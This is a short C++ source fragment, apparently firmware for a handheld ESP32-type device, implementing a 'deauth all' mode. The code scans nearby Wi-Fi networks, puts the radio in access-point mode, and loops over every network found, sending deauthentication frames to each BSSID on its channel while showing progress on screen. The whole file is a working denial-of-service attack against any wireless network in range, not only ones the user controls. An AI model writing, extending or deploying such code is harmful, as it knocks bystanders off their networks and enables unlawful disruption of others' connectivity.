// PID::WIFI_DEAUTH_ALL

static int _daIndex = 0;

void wifiDeauthAllLoop() {
	// Deferred setup: wait for a background scan to finish before switching the
	// radio to AP mode for deauth. The scan can span several frames while
	// isSetup() is consumed on frame 1, so remember it with a flag.
	static bool _daNeedsSetup = false;
	if (isSetup()) _daNeedsSetup = true;

	if (_daNeedsSetup && !ensureWifiScan()) {
		checkExit();
		return;
	}

	if (_daNeedsSetup) {
		_daNeedsSetup = false;
		if (wifiCount == 0) {
			centeredPrint(L->TXT_WIFI_NO_NETWORKS, MEDIUM_TEXT);
			// Fall through; the wifiCount==0 guard below returns each frame.
		} else {
			WiFi.mode(WIFI_AP);
			WiFi.softAP("deauth_all", "", 1, 1, 4, false);
			Wifi::deauthResetFrame();
			_daIndex = 0;
		}
	}

	checkExit();
	if (wifiCount == 0) {
		return;
	}

	String targetSsid = WiFi.SSID(_daIndex);
	uint8_t* targetBssid = WiFi.BSSID(_daIndex);
	int targetChannel = WiFi.channel(_daIndex);

	char counter[16];
	snprintf(counter, sizeof(counter), "%d/%d", _daIndex + 1, wifiCount);
	String lines[] = {
		String(counter),
		targetSsid.substring(0, 18),
		"Deauthing all..."
	};
	centeredPrintRows(lines, 3, MEDIUM_TEXT, true);
	drawSpinner();
	canvas.pushSprite(0, getStatusBarHeight());

	Wifi::deauthSendFrame(targetBssid, targetChannel);

	_daIndex = (_daIndex + 1) % wifiCount;
}
